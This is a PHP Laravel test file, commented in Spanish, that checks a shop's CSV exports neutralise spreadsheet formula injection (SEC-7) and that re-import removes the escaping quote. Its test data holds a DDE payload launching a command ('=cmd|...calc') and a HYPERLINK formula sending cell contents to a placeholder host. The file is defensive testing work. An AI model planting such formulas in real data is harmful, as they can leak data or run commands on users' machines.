<?php

namespace Tests\Feature;

use App\Models\Category;
use App\Models\Order;
use App\Models\OrderItem;
use App\Models\Product;
use App\Models\Tenant;
use App\Models\User;
use App\Support\CeldaCsv;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

/**
 * Que el CSV que se descarga el dueño no traiga fórmulas (`SEC-7`).
 *
 * **Lo que fallaba.** Para Excel, LibreOffice y Google Sheets una celda que
 * empieza por `=`, `+`, `-`, `@`, un tabulador o un retorno de carro es una
 * **fórmula**. `name` sólo valida `string|max:300`, así que
 * `=HYPERLINK("http://malo/?"&A1,"ver")` entra por el formulario o por el import
 * y se queda dormido en la base.
 *
 * **Y dispara en otro sitio del que entró:** se ejecuta en el escritorio del
 * dueño el día que pulsa *Exportar CSV*. Por eso el agujero no se ve mirando la
 * entrada, que es donde todo el mundo mira.
 *
 * Las cuatro exportaciones van por `ExportController::fila()`, así que los casos
 * de aquí cubren las cuatro por un solo camino —que es justamente lo que se
 * quería conseguir metiéndolas todas por ahí—.
 */
class CsvSinFormulasTest extends TestCase
{
    use RefreshDatabase;

    private Tenant $tienda;

    private User $admin;

    protected function setUp(): void
    {
        parent::setUp();

        $this->withoutMiddleware(ThrottleRequests::class);

        $this->tienda = Tenant::create([
            'slug' => 'tienda-csv',
            'name' => 'Tienda CSV',
            'whatsapp_number' => '51999000111',
            'is_active' => true,
            'is_published' => true,
            'currency' => 'PEN',
            // El import por CSV es una funcion del plan (SAAS-3).
            'plan' => 'enterprise',
        ]);

        $this->admin = new User([
            'name' => 'Duenio',
            'email' => 'duenio@tienda-csv.com',
            'password' => 'password123',
            'role' => 'admin',
            'is_active' => true,
        ]);
        $this->admin->tenant_id = $this->tienda->id;
        $this->admin->save();
    }

    // ------------------------------------------------------------ el catálogo

    public function test_el_nombre_de_un_producto_no_sale_como_formula(): void
    {
        $this->producto('=cmd|\'/c calc\'!A0');

        $csv = $this->exportar('/api/products/export');

        $this->assertStringContainsString("'=cmd", $csv);
        // Lo que no puede haber es la celda empezando por `=` justo tras el
        // separador o tras el salto de línea, que es lo que Excel evalúa.
        $this->assertStringNotContainsString("\n=cmd", $csv);
        $this->assertStringNotContainsString(';=cmd', $csv);
    }

    /**
     * Los cinco arranques peligrosos, no sólo el `=`. El `@` y el `+` los evalúa
     * Excel igual, y el tabulador y el retorno de carro sirven para empujar el
     * `=` al principio de la celda siguiente.
     */
    public function test_los_cinco_arranques_peligrosos_van_todos_con_comilla(): void
    {
        foreach (['=SUMA(A1)', '+1+1', '-1+1', '@SUMA(A1)', "\tmalo", "\rmalo"] as $nombre) {
            $this->assertSame("'".$nombre, CeldaCsv::segura($nombre), "El arranque de [{$nombre}] quedó sin neutralizar.");
        }
    }

    /**
     * **La decisión que no se ve, y la que un `str_starts_with` a secas habría
     * roto.** La utilidad de un reporte puede ser negativa, y `-50.00` empieza
     * por `-` pero no es una fórmula: Excel lo lee como el número menos
     * cincuenta. Prefijarlo lo convierte en texto, y una columna de dinero que
     * Excel no puede sumar es una exportación rota.
     */
    public function test_un_numero_negativo_sigue_siendo_un_numero(): void
    {
        $this->assertSame('-50.00', CeldaCsv::segura('-50.00'));
        $this->assertSame('-50', CeldaCsv::segura('-50'));
        $this->assertSame('+3.5', CeldaCsv::segura('+3.5'));

        // Pero un número con algo detrás ya no es un número.
        $this->assertSame("'-50.00+A1", CeldaCsv::segura('-50.00+A1'));
        $this->assertSame("'-1e3", CeldaCsv::segura('-1e3'));
    }

    public function test_un_nombre_normal_no_se_toca(): void
    {
        $this->producto('Kingston Fury 16GB');

        $csv = $this->exportar('/api/products/export');

        $this->assertStringContainsString('Kingston Fury 16GB', $csv);
        $this->assertStringNotContainsString("'Kingston", $csv);
    }

    // ------------------------------------------------------------- los pedidos

    public function test_el_nombre_del_cliente_no_sale_como_formula_en_los_pedidos(): void
    {
        $pedido = new Order([
            'customer_name' => '=HYPERLINK("http://malo/?"&A1,"ver")',
            'customer_phone' => '51988877766',
            'status' => 'pending',
            'total' => 100,
        ]);
        $pedido->tenant_id = $this->tienda->id;
        $pedido->save();

        $csv = $this->exportar('/api/orders/export');

        $this->assertStringNotContainsString(';=HYPERLINK', $csv);
        $this->assertStringContainsString("'=HYPERLINK", $csv);
    }

    // ------------------------------------------------------- el viaje de vuelta

    /**
     * `MOD-12` dejó escrito que exportar y reimportar tiene que conservar el
     * catálogo tal cual. La comilla la pone la exportación, así que la tiene que
     * quitar el importador: sin esto, el arreglo de `SEC-7` renombraría el
     * producto a la vuelta.
     */
    public function test_exportar_y_reimportar_no_deja_la_comilla_pegada(): void
    {
        $this->assertSame('=SUMA(A1)', CeldaCsv::sinPrefijo("'=SUMA(A1)"));

        // Una comilla que no puso la exportación se queda: sólo se quita cuando
        // detrás viene uno de los caracteres peligrosos.
        $this->assertSame("'Kingston", CeldaCsv::sinPrefijo("'Kingston"));
        $this->assertSame("'", CeldaCsv::sinPrefijo("'"));
    }

    public function test_el_import_lee_un_nombre_que_la_exportacion_escapo(): void
    {
        $categoria = new Category(['name' => 'Memorias', 'slug' => 'memorias']);
        $categoria->tenant_id = $this->tienda->id;
        $categoria->save();

        $csv = "nombre;precio;stock;categoria\n'=SUMA(A1);100;5;Memorias\n";

        Sanctum::actingAs($this->admin);

        $this->withHeader('X-Tenant', $this->tienda->slug)
            ->post('/api/products/import', [
                'file' => \Illuminate\Http\Testing\File::createWithContent('catalogo.csv', $csv),
            ])
            ->assertOk()
            ->assertJsonPath('created_count', 1);

        $this->tienda->makeCurrent();

        $this->assertSame('=SUMA(A1)', Product::first()->name);
    }

    // -------------------------------------------------------------- ayudantes

    private function producto(string $nombre): Product
    {
        $producto = new Product([
            'name' => $nombre,
            'price' => 100,
            'stock' => 5,
            'is_active' => true,
            'status' => 'published',
        ]);
        $producto->tenant_id = $this->tienda->id;
        $producto->save();

        return $producto;
    }

    private function exportar(string $ruta): string
    {
        Sanctum::actingAs($this->admin);

        $respuesta = $this->withHeader('X-Tenant', $this->tienda->slug)->get($ruta);
        $respuesta->assertOk();

        return $respuesta->streamedContent();
    }
}
